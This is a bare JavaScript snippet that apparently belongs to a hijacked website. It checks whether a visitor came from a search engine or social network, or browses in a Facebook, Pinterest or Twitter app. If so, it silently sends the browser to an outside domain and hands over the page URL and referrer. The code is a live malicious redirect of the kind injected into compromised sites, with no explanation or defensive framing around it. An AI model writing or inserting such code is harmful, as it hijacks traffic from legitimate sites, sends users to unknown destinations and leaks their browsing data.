var ars = 'https://www.stylesgurus.com';

if(['.google.', 'bing.', '.yahoo.', 'yandex.', 'facebook.', 'pinterest.', 'duckduckgo.', 'aol.', 'msn.', 'baidu.', 'slurp.', 'sogou.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
